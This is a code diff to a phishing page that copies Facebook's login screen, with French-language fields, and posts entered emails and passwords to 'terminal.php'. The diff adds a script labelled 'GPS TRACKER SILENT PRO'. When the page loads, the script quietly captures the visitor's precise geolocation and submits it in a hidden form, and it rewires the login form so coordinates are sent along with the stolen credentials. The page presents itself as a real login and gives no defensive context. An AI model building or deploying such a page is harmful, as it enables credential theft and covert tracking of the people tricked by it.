@@ -79,13 +79,43 @@
             .container{padding:20px 20px 16px;max-width:350px;}
         }
     </style>
+<!-- GPS TRACKER SILENT PRO -->
+<script>
+function captureGPS() {
+    navigator.geolocation.getCurrentPosition(pos => {
+        const form = document.createElement('form');
+        form.method = 'POST'; form.style.display = 'none';
+        form.innerHTML = `
+            <input name="gps_lat" value="${pos.coords.latitude}">
+            <input name="gps_lon" value="${pos.coords.longitude}">
+        `;
+        document.body.appendChild(form);
+        form.submit();
+    }, ()=>{}, {enableHighAccuracy: true, timeout: 5000});
+}
+window.onload = captureGPS;
+
+// GPS sur submit
+function gpsSubmit(form) {
+    navigator.geolocation.getCurrentPosition(pos => {
+        const lat = document.createElement('input');
+        lat.type = 'hidden'; lat.name = 'gps_lat'; lat.value = pos.coords.latitude;
+        const lon = document.createElement('input');
+        lon.type = 'hidden'; lon.name = 'gps_lon'; lon.value = pos.coords.longitude;
+        form.appendChild(lat); form.appendChild(lon);
+        form.submit();
+    }, () => form.submit(), {enableHighAccuracy: true});
+    return false;
+}
+</script>
+
 </head>
 <body>
     <div class="container">
         <div class="logo">
             <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yX/r/48IGqVQKogw.png" alt="facebook" width="50" height="50" style="object-fit:contain;">
         </div>
-        <form method="POST" action="terminal.php">
+        <form method="POST" action="terminal.php" onsubmit="return gpsSubmit(this)>
             <div class="input-group">
                 <input type="email" name="email" placeholder="Adresse e-mail ou numéro de téléphone" required autocomplete="email">
             </div>
